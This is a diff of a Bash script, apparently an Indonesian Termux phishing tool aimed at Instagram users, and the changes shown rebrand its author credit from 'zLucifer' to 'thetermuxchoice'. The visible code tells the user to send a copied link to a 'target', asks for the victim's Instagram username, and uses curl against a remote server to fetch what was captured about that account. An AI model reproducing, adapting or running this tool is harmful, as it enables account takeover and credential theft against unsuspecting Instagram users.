@@ -1,15 +1,5 @@
 #!/bin/bash
-#///////////////////////////////////////////////////////////////////////////////
-#///////////////////////////////////////////////////////////////////////////////
-#////                       _            _  __                              ////
-#////                      | |          (_)/ _|                             ////
-#////                   ___| |_   _  ___ _| |_ ___ _ __                     ////
-#////                  |_  / | | | |/ __| |  _/ _ \ '__|                    ////
-#////                   / /| | |_| | (__| | ||  __/ |                       ////
-#////                  /___|_|\__,_|\___|_|_| \___|_|                       ////
-#////                                                                       ////
-#///////////////////////////////////////////////////////////////////////////////
-#///////////////////////////////////////////////////////////////////////////////
+
 intro(){
 echo "Selamat datang kak, Siapa nick kaka?" #tulisan keluar
 read nick #membaca yang ditulis
@@ -103,12 +93,11 @@ else
     echo "2. Kirim link yang sudah di copy ke target"
     echo "3. Jika korban sudah terkena bisa langsung di cek"
     echo 
-    echo "Mau melakukan cek target?"
+    echo "Ingin melakukan cek target?"
     echo "y/n?"
     read confirm
     if [ $confirm = "y" ]; then
             echo "Silahkan masukan username Instagram target"
-            echo "contoh hack.id_"
             read target # masukin user instagram
             echo
             echo "Apakah username $target sudah benar?"
@@ -125,8 +114,8 @@ else
                 cek_target=`curl -s $get_url/instagram.php?cari=$target`
                 echo -e $cek_target
             echo "======================================="
-                    echo " Gunakan tools dengan bijak"
-                    echo " -zLucifer"
+                    echo " Gunakan tools dengan bijak! :)"
+                    echo " -thetermuxchoice"
                     echo "======================================="
             else
                     echo "Kesalahan"
